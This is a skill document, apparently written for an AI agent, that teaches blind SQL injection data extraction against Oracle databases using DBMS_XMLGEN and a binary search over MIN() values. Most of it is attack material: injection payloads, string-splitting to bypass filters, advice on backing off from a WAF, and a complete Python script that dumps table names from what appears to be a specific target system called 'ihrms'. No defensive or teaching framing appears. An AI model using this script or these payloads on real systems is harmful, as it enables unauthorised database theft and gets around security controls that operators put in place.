---
name: oracle-sqli-blind-extraction
description: Oracle blind SQLi extraction via DBMS_XMLGEN boolean oracle + MIN/binary-search for fast string dumping. Use when you have a boolean-blind SQLi in Oracle and need to extract schema/data without UNION/error-based channels.
tags:
  - oracle
  - sqli
  - blind
  - extraction
---

# Oracle Blind SQLi Extraction (DBMS_XMLGEN)

## Trigger
- Target is Oracle.
- You have boolean-blind SQLi (TRUE/FALSE or count=1/count=0) via a numeric or string parameter.
- UNION, error-based, and out-of-band channels are blocked or unreliable.

## Core Technique: XMLGEN Boolean via LENGTH()

Oracle `DBMS_XMLGEN.GETXML('SELECT ...')` returns XML if the query returns rows. Wrap it in `LENGTH(...)>0` to turn that into a boolean. The server-side code you control typically evaluates this in a CASE expression that maps TRUE/FALSE to distinct strings (e.g., '152654' vs 'zzzz'). Count rows in the response to read the boolean.

**Minimal probe pattern:**
```
LENGTH(DBMS_XMLGEN.GETXML('SEL'||'ECT 1 c FROM dual))>0
```
Split `'SELECT'` with string concat (`'SEL'||'ECT'`) if needed to bypass simple pattern filters.

## Fast Extraction: MIN() + Binary Search (7 req/byte)

Linear character-by-character extraction is ~36 req/byte. Use `MIN(column)` with a binary search on the character set to get ~7 req/byte.

**Algorithm:**
1. Use `MIN(col)` from the target table/query.
2. Binary search printable ASCII (33–126) by checking existence of rows with prefix `>= out+c`.
3. Stop when `MIN(col) <= out` (the minimum matches the built prefix).

**Resumable dump:**
- Use `WHERE col > 'PREV' AND ROWNUM=1` to paginate.
- Double single-quotes for SQL embedding: `WHERE col > ''PREV''`.
- Deduplicate results client-side; Oracle string comparison is case-sensitive by default.

## Scripting Template (concise, no fluff)

```python
import sys, time
sys.path.insert(0, r"C:\path\to\lib")
from ihrms_lib import raw, mint
mint()

def ask(test, retries=4):
    for i in range(retries):
        st, n, m, _ = raw("' || (CASE WHEN " + test + " THEN '152654' ELSE 'zzzz' END) || '", 60)
        if st == "WAF":
            time.sleep(15 * (2 ** i))  # exponential backoff
            continue
        if st == "SUCCESS":
            return n == 1
        time.sleep(3)
    return None

def G(expr):
    return "DBMS_XMLGEN.GETXML('SEL'||'ECT " + expr + "')"

def dump_next(prev, table="user_tables", col="table_name"):
    p = prev.replace("'", "''")
    def exists_row(extra):
        inner = f"1 c FROM {table} WHERE {col} > ''{p}''" + extra + " AND ROWNUM=1"
        return ask(f"LENGTH({G(inner)})>0") is True
    if not exists_row(""):
        return None
    out = ""
    for _ in range(40):
        lo, hi = 33, 126
        if not exists_row(f" AND {col} >= ''{out}{chr(lo)}''") and exists_row(f" AND {col} < ''{out}{chr(lo)}''"):
            break
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if not exists_row(f" AND {col} < ''{out}{chr(mid)}''"):
                lo = mid
            else:
                hi = mid - 1
            time.sleep(0.1)
        out += chr(lo)
        if exists_row(f" AND {col} <= ''{out}''"):
            break
    return out

if __name__ == "__main__":
    known = set(open("tables.txt").read().splitlines())
    prev = max(known) if known else ""
    f = open("tables.txt", "a", buffering=1)
    for i in range(300):
        try:
            nm = dump_next(prev)
        except Exception as e:
            print(f"ERROR at {prev}: {e}, sleeping 60s...")
            sys.stdout.flush()
            time.sleep(60)
            continue
        if not nm:
            print("no more tables after", repr(prev))
            break
        if nm in known:
            prev = nm
            continue
        f.write(nm + "\n")
        print(len(known)+i+1, nm)
        sys.stdout.flush()
        known.add(nm)
        prev = nm
    print("Total tables:", len(open("tables.txt").read().splitlines()))
    f.close()
```

## Pitfalls

1. **Oracle empty string = NULL.** Use a space `' '` or skip `>` predicate if you need to anchor from the start.
2. **Quote escaping in Python f-strings.** Use `prev.replace("'", "''")` or literal doubled-quotes in the SQL string (`''PREV''`).
3. **WAF learning.** If a payload triggers WAF, back off exponentially (15s, 30s, 60s...) before retrying.
4. **Connection timeouts.** Wrap `dump_next` in `try/except Exception` with a long sleep; do not let one timeout kill the whole dump.
5. **Duplicate rows.** Oracle `ROWNUM` pagination can revisit names if the session reorders; dedupe client-side with a `known` set.
6. **COUNT(*) with XMLGEN.** `COUNT(*)` inside `DBMS_XMLGEN.GETXML` often returns length=0 even when rows exist. Use `LENGTH(GETXML('SELECT 1 c FROM ...'))>0` instead.

## Verification Checklist

- [ ] `dump_next('KNOWN_LAST')` returns the next name in sequence.
- [ ] No `~`, padding, or stray quotes in returned names.
- [ ] `tables.txt` is alphabetically sorted and deduplicated at the end.
- [ ] Background job restarts cleanly from the last entry.

## References
- `references/oracle_xmlgen_boolean.md` — DBMS_XMLGEN boolean oracle pattern details.
- `references/oracle_binary_search_extraction.md` — MIN + binary search algorithm walkthrough with examples.
- `references/ihrms_dump_continue_template.py` — proven working extraction script for Oracle user_tables via MIN + binary search with WAF retry, dedupe, and resume support.
